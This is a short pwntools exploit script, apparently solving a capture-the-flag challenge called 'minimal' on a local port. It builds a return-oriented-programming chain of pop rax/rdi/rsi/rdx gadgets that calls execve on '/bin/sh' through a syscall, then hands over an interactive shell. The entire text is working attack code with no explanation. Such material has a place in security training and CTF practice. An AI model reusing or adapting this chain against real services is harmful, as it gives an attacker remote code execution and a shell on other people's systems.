from pwn import *

CHAL = "minimal"

exe = ELF("minimal")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"

p = remote("localhost", 7005)
payload = flat({
    8: [
        p64((rop.find_gadget(['pop rax', 'ret']))[0]),
        p64(59),
        p64((rop.find_gadget(['pop rdi', 'ret']))[0]),
        p64(next(exe.search(b'/bin/sh'))),
        p64((rop.find_gadget(['pop rsi', 'ret']))[0]),
        p64(0),
        p64((rop.find_gadget(['pop rdx', 'ret']))[0]),
        p64(0),
        p64((rop.find_gadget(['syscall']))[0]),
    ] 
})
p.sendline(payload)
# automate inputs as necessary here

p.interactive()
